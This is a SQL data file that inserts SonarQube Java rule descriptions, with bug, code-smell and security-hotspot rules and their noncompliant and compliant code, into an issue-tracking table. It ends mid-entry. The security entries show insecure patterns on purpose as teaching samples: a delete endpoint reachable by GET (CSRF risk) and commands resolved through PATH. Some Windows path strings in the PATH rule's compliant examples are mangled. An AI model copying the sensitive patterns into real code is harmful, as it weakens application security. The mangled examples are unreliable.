INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3752', 'Allowing both safe and unsafe HTTP methods is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>An HTTP method is safe when used to perform a read-only operation, such as retrieving information. In contrast, an unsafe HTTP method is used to
change the state of an application, for instance to update a user''s profile on a web application.</p>
<p>Common safe HTTP methods are GET, HEAD, or OPTIONS.</p>
<p>Common unsafe HTTP methods are POST, PUT and DELETE.</p>
<p>Allowing both safe and unsafe HTTP methods to perform a specific operation on a web application could impact its security, for example CSRF
protections are most of the time only protecting operations performed by unsafe HTTP methods.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> HTTP methods are not defined at all for a route/controller of the application. </li>
  <li> Safe HTTP methods are defined and used for a route/controller that can change the state of an application. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>For all the routes/controllers of an application, the authorized HTTP methods should be explicitly defined and safe HTTP methods should only be
used to perform read-only operations.</p>
<h2>Sensitive Code Example</h2>
<pre>
@RequestMapping("/delete_user")  // Sensitive: by default all HTTP methods are allowed
public String delete1(String username) {
// state of the application will be changed here
}

@RequestMapping(path = "/delete_user", method = {RequestMethod.GET, RequestMethod.POST}) // Sensitive: both safe and unsafe methods are allowed
String delete2(@RequestParam("id") String id) {
// state of the application will be changed here
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@RequestMapping("/delete_user", method = RequestMethod.POST)  // Compliant
public String delete1(String username) {
// state of the application will be changed here
}

@RequestMapping(path = "/delete_user", method = RequestMethod.POST) // Compliant
String delete2(@RequestParam("id") String id) {
// state of the application will be changed here
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control">OWASP Top 10 2017 Category A5</a> -
  Broken Access Control </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/352.html">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li>
  <li> <a href="https://owasp.org/www-community/attacks/csrf">OWASP: Cross-Site Request Forgery</a> </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat1">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> <a href="https://docs.spring.io/spring-security/site/docs/5.0.x/reference/html/csrf.html#csrf-use-proper-verbs">Spring Security Official
  Documentation: Use proper HTTP verbs (CSRF protection)</a> </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3753', '"@Controller" classes that use "@SessionAttributes" must call "setComplete" on their "SessionStatus" objects', 'sonarqube', 'Bug', '<p>A Spring <code>@Controller</code> that uses <code>@SessionAttributes</code> is designed to handle a stateful / multi-post form. Such
<code>@Controller</code>s use the specified <code>@SessionAttributes</code> to store data on the server between requests. That data should be cleaned
up when the session is over, but unless <code>setComplete()</code> is called on the <code>SessionStatus</code> object from a
<code>@RequestMapping</code> method, neither Spring nor the JVM will know it''s time to do that. Note that the <code>SessionStatus</code> object must
be passed to that method as a parameter.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Controller
@SessionAttributes("hello")  // Noncompliant; this doesn''t get cleaned up
public class HelloWorld {

  @RequestMapping("/greet", method = GET)
  public String greet(String greetee) {

    return "Hello " + greetee;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Controller
@SessionAttributes("hello")
public class HelloWorld {

  @RequestMapping("/greet", method = GET)
  public String greet(String greetee) {

    return "Hello " + greetee;
  }

  @RequestMapping("/goodbye", method = POST)
  public String goodbye(SessionStatus status) {
    //...
    status.setComplete();
  }

}
</pre>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3776', 'Cognitive Complexity of methods should not be too high', 'sonarqube', 'Code Smell', '<p>Cognitive Complexity is a measure of how hard the control flow of a method is to understand. Methods with high Cognitive Complexity will be
difficult to maintain.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://redirect.sonarsource.com/doc/cognitive-complexity.html">Cognitive Complexity</a> </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3822', 'Hibernate should not update database schemas', 'sonarqube', 'Bug', '<p>The use of any value but <code>"validate"</code> for <code>hibernate.hbm2ddl.auto</code> may cause the database schema used by your application to
be changed, dropped, or cleaned of all data. In short, the use of this property is risky, and should only be used in production with the
<code>"validate"</code> option, if it is used at all.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;session-factory&gt;
  &lt;property name="hibernate.hbm2ddl.auto"&gt;update&lt;/property&gt;  &lt;!-- Noncompliant --&gt;
&lt;/session-factory&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;session-factory&gt;
  &lt;property name="hibernate.hbm2ddl.auto"&gt;validate&lt;/property&gt;  &lt;!-- Compliant --&gt;
&lt;/session-factory&gt;
</pre>
<p>or</p>
<pre>
&lt;session-factory&gt;
  &lt;!-- Property deleted --&gt;
&lt;/session-factory&gt;
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3824', '"Map.get" and value test should be replaced with single method call', 'sonarqube', 'Code Smell', '<p>It''s a common pattern to test the result of a <code>java.util.Map.get()</code> against <code>null</code> or calling
<code>java.util.Map.containsKey()</code> before proceeding with adding or changing the value in the map. However the <code>java.util.Map</code> API
offers a significantly better alternative in the form of the <code>computeIfPresent()</code> and <code>computeIfAbsent()</code> methods. Using these
instead leads to cleaner and more readable code.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is not 8.</p>
<h2>Noncompliant Code Example</h2>
<pre>
V value = map.get(key);
if (value == null) {  // Noncompliant
  value = V.createFor(key);
  if (value != null) {
    map.put(key, value);
  }
}
if (!map.containsKey(key)) {  // Noncompliant
  value = V.createFor(key);
  if (value != null) {
    map.put(key, value);
  }
}
return value;
</pre>
<h2>Compliant Solution</h2>
<pre>
return map.computeIfAbsent(key, k -&gt; V.createFor(k));
</pre>
<h2>Exceptions</h2>
<p>This rule will not raise an issue when trying to add <code>null</code> to a map, because <code>computeIfAbsent</code> will not add the entry if the
value returned by the function is <code>null</code>.</p>
<h2>See also</h2>
<ul>
  <li> <a href=''/coding_rules#rule_key=java%3AS6104''>S6104</a> - Map "computeIfAbsent()" and "computeIfPresent()" should not be used to add "null" values. </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3864', '"Stream.peek" should be used with caution', 'sonarqube', 'Code Smell', '<p>According to its JavaDocs, the intermediate Stream operation <code>java.util.Stream.peek()</code> “exists mainly to support debugging”
purposes.</p>
<p>A key difference with other intermediate Stream operations is that the Stream implementation is free to skip calls to <code>peek()</code> for
optimization purpose. This can lead to <code>peek()</code> being unexpectedly called only for some or none of the elements in the Stream.</p>
<p>As a consequence, relying on <code>peek()</code> without careful consideration can lead to error-prone code.</p>
<p>This rule raises an issue for each use of peek() to be sure that it is challenged and validated by the team to be meant for production
debugging/logging purposes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Stream.of("one", "two", "three", "four")
         .filter(e -&gt; e.length() &gt; 3)
         .peek(e -&gt; System.out.println("Filtered value: " + e)); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Stream.of("one", "two", "three", "four")
         .filter(e -&gt; e.length() &gt; 3)
         .foreach(e -&gt; System.out.println("Filtered value: " + e));
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.oracle.com/javase/8/docs/api/java/util/stream/Stream.html#peek-java.util.function.Consumer-">Java 8 API Documentation</a>
  </li>
  <li> 4comprehension: <a href="https://4comprehension.com/idiomatic-peeking/">Idiomatic Peeking with Java Stream API</a> </li>
  <li> Data Geekery: <a href="https://blog.jooq.org/2014/06/13/java-8-friday-10-subtle-mistakes-when-using-the-streams-api/">10 Subtle Mistakes When
  Using the Streams API</a> </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3878', 'Arrays should not be created for varargs parameters', 'sonarqube', 'Code Smell', '<p>There''s no point in creating an array solely for the purpose of passing it as a varargs (<code>...</code>) argument; varargs <em>is</em> an array.
Simply pass the elements directly. They will be consolidated into an array automatically. Incidentally passing an array where <code>Object ...</code>
is expected makes the intent ambiguous: Is the array supposed to be one object or a collection of objects?</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void callTheThing() {
  //...
  doTheThing(new String[] { "s1", "s2"});  // Noncompliant: unnecessary
  doTheThing(new String[12]);  // Compliant
  doTheOtherThing(new String[8]);  // Noncompliant: ambiguous
  // ...
}

public void doTheThing (String ... args) {
  // ...
}

public void doTheOtherThing(Object ... args) {
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void callTheThing() {
  //...
  doTheThing("s1", "s2");
  doTheThing(new String[12]);
  doTheOtherThing((Object[]) new String[8]);
   // ...
}

public void doTheThing (String ... args) {
  // ...
}

public void doTheOtherThing(Object ... args) {
  // ...
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3923', 'All branches in a conditional structure should not have exactly the same implementation', 'sonarqube', 'Bug', '<p>Having all branches in a <code>switch</code> or <code>if</code> chain with the same implementation is an error. Either a copy-paste error was made
and something different should be executed, or there shouldn''t be a <code>switch</code>/<code>if</code> chain at all.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (b == 0) {  // Noncompliant
  doOneMoreThing();
} else {
  doOneMoreThing();
}

int b = a &gt; 12 ? 4 : 4;  // Noncompliant

switch (i) {  // Noncompliant
  case 1:
    doSomething();
    break;
  case 2:
    doSomething();
    break;
  case 3:
    doSomething();
    break;
  default:
    doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>This rule does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without <code>default</code>
clauses.</p>
<pre>
if(b == 0) {    //no issue, this could have been done on purpose to make the code more readable
  doSomething();
} else if(b == 1) {
  doSomething();
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3937', 'Number patterns should be regular', 'sonarqube', 'Code Smell', '<p>The use of punctuation characters to separate subgroups in a number can make the number more readable. For instance consider 1,000,000,000 versus
1000000000. But when the grouping is irregular, such as 1,000,00,000; it indicates an error. </p>
<p>This rule raises an issue when underscores (<code>_</code>) are used to break a number into irregular subgroups.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int duos = 1_00_00;
int million = 1_000_00_000;  // Noncompliant
int thousand = 1000;
int tenThousand = 100_00;  // Noncompliant
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3958', 'Intermediate Stream methods should not be left unused', 'sonarqube', 'Bug', '<p>There are two types of stream operations: intermediate operations, which return another stream, and terminal operations, which return something
other than a stream. Intermediate operations are lazy, meaning they aren''t actually executed until and unless a terminal stream operation is performed
on their results. Consequently if the result of an intermediate stream operation is not fed to a terminal operation, it serves no purpose, which is
almost certainly an error.</p>
<h2>Noncompliant Code Example</h2>
<pre>
widgets.stream().filter(b -&gt; b.getColor() == RED); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int sum = widgets.stream()
                      .filter(b -&gt; b.getColor() == RED)
                      .mapToInt(b -&gt; b.getWeight())
                      .sum();
Stream&lt;Widget&gt; pipeline = widgets.stream()
                                 .filter(b -&gt; b.getColor() == GREEN)
                                 .mapToInt(b -&gt; b.getWeight());
sum = pipeline.sum();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.oracle.com/javase/8/docs/api/java/util/stream/package-summary.html#StreamOps">Stream Operations</a> </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3959', 'Consumed Stream pipelines should not be reused', 'sonarqube', 'Bug', '<p>Stream operations are divided into intermediate and terminal operations, and are combined to form stream pipelines. After the terminal operation is
performed, the stream pipeline is considered consumed, and cannot be used again. Such a reuse will yield unexpected results.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Stream&lt;Widget&gt; pipeline = widgets.stream().filter(b -&gt; b.getColor() == RED);
int sum1 = pipeline.sum();
int sum2 = pipeline.mapToInt(b -&gt; b.getWeight()).sum(); // Noncompliant
</pre>
<h2>See</h2>
<p><a href="https://docs.oracle.com/javase/8/docs/api/java/util/stream/package-summary.html#StreamOps">Stream Operations</a></p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3972', 'Conditionals should start on new lines', 'sonarqube', 'Code Smell', '<p>Code is clearest when each statement has its own line. Nonetheless, it is a common pattern to combine on the same line an <code>if</code> and its
resulting <em>then</em> statement. However, when an <code>if</code> is placed on the same line as the closing <code>}</code> from a preceding
<em>then</em>, <em>else</em> or <em>else if</em> part, it is either an error - <code>else</code> is missing - or the invitation to a future error as
maintainers fail to understand that the two statements are unconnected.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition1) {
  // ...
} if (condition2) {  // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition1) {
  // ...
} else if (condition2) {
  //...
}
</pre>
<p>Or</p>
<pre>
if (condition1) {
  // ...
}

if (condition2) {
  //...
}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3973', 'A conditionally executed single line should be denoted by indentation', 'sonarqube', 'Code Smell', '<p>In the absence of enclosing curly braces, the line immediately after a conditional is the one that is conditionally executed. By both convention
and good practice, such lines are indented. In the absence of both curly braces and indentation the intent of the original programmer is entirely
unclear and perhaps not actually what is executed. Additionally, such code is highly likely to be confusing to maintainers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)  // Noncompliant
doTheThing();

doTheOtherThing();
somethingElseEntirely();

foo();
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition)
  doTheThing();

doTheOtherThing();
somethingElseEntirely();

foo();
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3981', 'Collection sizes and array length comparisons should make sense', 'sonarqube', 'Bug', '<p>The size of a collection and the length of an array are always greater than or equal to zero. So testing that a size or length is greater than or
equal to zero doesn''t make sense, since the result is always <code>true</code>. Similarly testing that it is less than zero will always return
<code>false</code>. Perhaps the intent was to check the non-emptiness of the collection or array instead. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if (myList.size() &gt;= 0) { ... }

if (myList.size() &lt; 0) { ... }

boolean result = myArray.length &gt;= 0;

if (0 &gt; myArray.length) { ... }
</pre>
<h2>Compliant Solution</h2>
<pre>
if (!myList.isEmpty()) { ... }

if (myArray.length &gt;= 42) { ... }
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3984', 'Exceptions should not be created without being thrown', 'sonarqube', 'Bug', '<p>Creating a new <code>Throwable</code> without actually throwing it is useless and is probably due to a mistake.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x &lt; 0)
  new IllegalArgumentException("x must be nonnegative");
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x &lt; 0)
  throw new IllegalArgumentException("x must be nonnegative");
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3985', 'Unused "private" classes should be removed', 'sonarqube', 'Code Smell', '<p><code>private</code> classes that are never used are dead code: unnecessary, inoperative code that should be removed. Cleaning out dead code
decreases the size of the maintained codebase, making it easier to understand the program and preventing bugs from being introduced.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo
{
  ...
  private class MyUnusedPrivateClass {...} // Noncompliant
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S3986', 'Week Year ("YYYY") should not be used for date formatting', 'sonarqube', 'Bug', '<p>Few developers are aware of the difference between <code>Y</code> for "Week year" and <code>y</code> for Year when formatting and parsing a date
with <code>SimpleDateFormat</code> or <code>DateTimeFormatter</code>. That''s likely because for most dates, Week year and Year are the same, so
testing at any time other than the first or last week of the year will yield the same value for both <code>y</code> and <code>Y</code>. But in the
last week of December and the first week of January, you may get unexpected results.</p>
<p>According to the <a href="http://docs.oracle.com/javase/8/docs/api/java/util/GregorianCalendar.html#week_year">Javadoc</a>:</p>
<blockquote>
  <p>A week year is in sync with a WEEK_OF_YEAR cycle. All weeks between the first and last weeks (inclusive) have the same week year value.
  Therefore, the first and last days of a week year may have different calendar year values.</p>
  <p>For example, January 1, 1998 is a Thursday. If getFirstDayOfWeek() is MONDAY and getMinimalDaysInFirstWeek() is 4 (ISO 8601 standard compatible
  setting), then week 1 of 1998 starts on December 29, 1997, and ends on January 4, 1998. The week year is 1998 for the last three days of calendar
  year 1997. If, however, getFirstDayOfWeek() is SUNDAY, then week 1 of 1998 starts on January 4, 1998, and ends on January 10, 1998; the first three
  days of 1998 then are part of week 53 of 1997 and their week year is 1997.</p>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
Date date = new SimpleDateFormat("yyyy/MM/dd").parse("2015/12/31");
String result = new SimpleDateFormat("YYYY/MM/dd").format(date);   //Noncompliant; yields ''2016/12/31''
result = DateTimeFormatter.ofPattern("YYYY/MM/dd").format(date); //Noncompliant; yields ''2016/12/31''
</pre>
<h2>Compliant Solution</h2>
<pre>
Date date = new SimpleDateFormat("yyyy/MM/dd").parse("2015/12/31");
String result = new SimpleDateFormat("yyyy/MM/dd").format(date);   //Yields ''2015/12/31'' as expected
result = DateTimeFormatter.ofPattern("yyyy/MM/dd").format(date); //Yields ''2015/12/31'' as expected
</pre>
<h2>Exceptions</h2>
<pre>
Date date = new SimpleDateFormat("yyyy/MM/dd").parse("2015/12/31");
String result = new SimpleDateFormat("YYYY-ww").format(date);  //compliant, ''Week year'' is used along with ''Week of year''. result = ''2016-01''
DateTimeFormatter.ofPattern("YYYY-ww").format(date); //compliant; yields ''2016-01'' as expected
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4032', 'Packages containing only "package-info.java" should be removed', 'sonarqube', 'Code Smell', '<p>There is no reason to have a package that is empty except for "package-info.java". Such packages merely clutter a project, taking up space but
adding no value. </p>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4034', '"Stream" call chains should be simplified when possible', 'sonarqube', 'Code Smell', '<p>When using the <code>Stream</code> API, call chains should be simplified as much as possible. Not only does it make the code easier to read, it
also avoid creating unnecessary temporary objects.</p>
<p>This rule raises an issue when one of the following substitution is possible:</p>
<table>
  <tbody>
    <tr>
      <th>Original</th>
      <th>Preferred</th>
    </tr>
    <tr>
      <td><code>stream.filter(predicate).findFirst().isPresent()</code></td>
      <td><code>stream.anyMatch(predicate)</code></td>
    </tr>
    <tr>
      <td><code>stream.filter(predicate).findAny().isPresent()</code></td>
      <td><code>stream.anyMatch(predicate)</code></td>
    </tr>
    <tr>
      <td><code>!stream.anyMatch(predicate)</code></td>
      <td><code>stream.noneMatch(predicate)</code></td>
    </tr>
    <tr>
      <td><code>!stream.anyMatch(x -&gt; !(...))</code></td>
      <td><code>stream.allMatch(...)</code></td>
    </tr>
    <tr>
      <td><code>stream.map(mapper).anyMatch(Boolean::booleanValue)</code></td>
      <td><code>stream.anyMatch(predicate)</code></td>
    </tr>
  </tbody>
</table>
<h2>Noncompliant Code Example</h2>
<pre>
boolean hasRed = widgets.stream().filter(w -&gt; w.getColor() == RED).findFirst().isPresent(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
boolean hasRed = widgets.stream().anyMatch(w -&gt; w.getColor() == RED);
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4036', 'Searching OS commands in PATH is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>When executing an OS command and unless you specify the full path to the executable, then the locations in your application''s <code>PATH</code>
environment variable will be searched for the executable. That search could leave an opening for an attacker if one of the elements in
<code>PATH</code> is a directory under his control. </p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The directories in the PATH environment variable may be defined by not trusted entities. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Fully qualified/absolute path should be used to specify the OS command to execute.</p>
<h2>Sensitive Code Example</h2>
<p>The full path of the command is not specified and thus the executable will be searched in all directories listed in the <code>PATH</code>
environment variable:</p>
<pre>
Runtime.getRuntime().exec("make");  // Sensitive
Runtime.getRuntime().exec(new String[]{"make"});  // Sensitive

ProcessBuilder builder = new ProcessBuilder("make");  // Sensitive
builder.command("make");  // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>The command is defined by its full path:</p>
<pre>
Runtime.getRuntime().exec("/usr/bin/make");  // Compliant
Runtime.getRuntime().exec(new String[]{"~/bin/make"});  // Compliant

ProcessBuilder builder = new ProcessBuilder("./bin/make");  // Compliant
builder.command("../bin/make");  // Compliant
builder.command(Arrays.asList("..inmake", "-j8")); // Compliant

builder = new ProcessBuilder(Arrays.asList(".make"));  // Compliant
builder.command(Arrays.asList("C:inmake", "-j8"));  // Compliant
builder.command(Arrays.asList("\\SERVERinmake"));  // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">OWASP Top 10 2017 Category A1</a> - Injection </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/426.html">MITRE, CWE-426</a> - Untrusted Search Path </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/427.html">MITRE, CWE-427</a> - Uncontrolled Search Path Element </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4042', '"java.nio.Files#delete" should be preferred', 'sonarqube', 'Code Smell', '<p>When <code>java.io.File#delete</code> fails, this <code>boolean</code> method simply returns <code>false</code> with no indication of the cause. On
the other hand, when <code>java.nio.file.Files#delete</code> fails, this <code>void</code> method returns one of a series of exception types to better
indicate the cause of the failure. And since more information is generally better in a debugging situation, <code>java.nio.file.Files#delete</code> is
the preferred option.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void cleanUp(Path path) {
  File file = new File(path);
  if (!file.delete()) {  // Noncompliant
    //...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void cleanUp(Path path) throws NoSuchFileException, DirectoryNotEmptyException, IOException {
  Files.delete(path);
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4065', '"ThreadLocal.withInitial" should be preferred', 'sonarqube', 'Code Smell', '<p>Java 8 introduced <code>ThreadLocal.withInitial</code> which is a simpler alternative to creating an anonymous inner class to initialise a
<code>ThreadLocal</code> instance.</p>
<p>This rule raises an issue when a <code>ThreadLocal</code> anonymous inner class can be replaced by a call to
<code>ThreadLocal.withInitial</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
ThreadLocal&lt;List&lt;String&gt;&gt; myThreadLocal =
    new ThreadLocal&lt;List&lt;String&gt;&gt;() { // Noncompliant
        @Override
        protected List&lt;String&gt; initialValue() {
            return new ArrayList&lt;String&gt;();
        }
    };
</pre>
<h2>Compliant Solution</h2>
<pre>
ThreadLocal&lt;List&lt;String&gt;&gt; myThreadLocal = ThreadLocal.withInitial(ArrayList::new);
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4087', '"close()" calls should not be redundant', 'sonarqube', 'Code Smell', '<p>Java 7''s try-with-resources structure automatically handles closing the resources that the <code>try</code> itself opens. Thus, adding an explicit
<code>close()</code> call is redundant and potentially confusing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try (PrintWriter writer = new PrintWriter(process.getOutputStream())) {
  String contents = file.contents();
  writer.write(new Gson().toJson(new MyObject(contents)));
  writer.flush();
  writer.close();  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try (PrintWriter writer = new PrintWriter(process.getOutputStream())) {
  String contents = file.contents();
  writer.write(new Gson().toJson(new MyObject(contents)));
  writer.flush();
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4142', 'Duplicate values should not be passed as arguments', 'sonarqube', 'Code Smell', '<p>There are valid cases for passing a variable multiple times into the same method call, but usually doing so is a mistake, and something else was
intended for one of the arguments.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (compare(myPoint.x, myPoint.x) != 0) { // Noncompliant
&nbsp;&nbsp;//...
}

if (compare(getNextValue(), getNextValue()) != 0) { // Noncompliant
&nbsp;&nbsp;// ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (compare(myPoint.x, myPoint.y) != 0) {
&nbsp;&nbsp;//...
}

Object v1 = getNextValue();
Object v2 = getNextValue();
if (compare(v1, v2) != 0) {
&nbsp;&nbsp;// ...
}
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>', 'java', 'DEPRECATED', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4143', 'Map values should not be replaced unconditionally', 'sonarqube', 'Bug', '<p>It is highly suspicious when a value is saved for a key or index and then unconditionally overwritten. Such replacements are likely errors.</p>
<h2>Noncompliant Code Example</h2>
<pre>
letters.put("a", "Apple");
letters.put("a", "Boy");  // Noncompliant

towns[i] = "London";
towns[i] = "Chicago";  // Noncompliant
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4144', 'Methods should not have identical implementations', 'sonarqube', 'Code Smell', '<p>When two methods have the same implementation, either it was a mistake - something else was intended - or the duplication was intentional, but may
be confusing to maintainers. In the latter case, one implementation should invoke the other. Numerical and string literals are not taken into account.
</p>
<h2>Noncompliant Code Example</h2>
<pre>
private final static String CODE = "bounteous";

public String calculateCode() {
  doTheThing();
  return CODE;
}

public String getName() {  // Noncompliant
  doTheThing();
  return CODE;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private final static String CODE = "bounteous";

public String getCode() {
  doTheThing();
  return CODE;
}

public String getName() {
  return getCode();
}
</pre>
<h2>Exceptions</h2>
<p>Methods that are not accessors (getters and setters), with fewer than 2 statements are ignored.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4165', 'Assignments should not be redundant', 'sonarqube', 'Code Smell', '<p>The transitive property says that if <code>a == b</code> and <code>b == c</code>, then <code>a == c</code>. In such cases, there''s no point in
assigning <code>a</code> to <code>c</code> or vice versa because they''re already equivalent. </p>
<p>This rule raises an issue when an assignment is useless because the assigned-to variable already holds the value on all execution paths.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a = b;
c = a;
b = c; // Noncompliant: c and b are already the same
</pre>
<h2>Compliant Solution</h2>
<pre>
a = b;
c = a;
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4174', 'Local constants should follow naming conventions for constants', 'sonarqube', 'Code Smell', '<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all local, <code>final</code>, initialized, primitive
variables, have names that match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$</code>:</p>
<pre>
public void doSomething() {
  final int local = 42;
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething() {
  final int LOCAL = 42;
  ...
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4201', 'Null checks should not be used with "instanceof"', 'sonarqube', 'Code Smell', '<p>There''s no need to null test in conjunction with an <code>instanceof</code> test. <code>null</code> is not an <code>instanceof</code> anything, so
a null check is redundant.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x != null &amp;&amp; x instanceof MyClass) { ... }  // Noncompliant

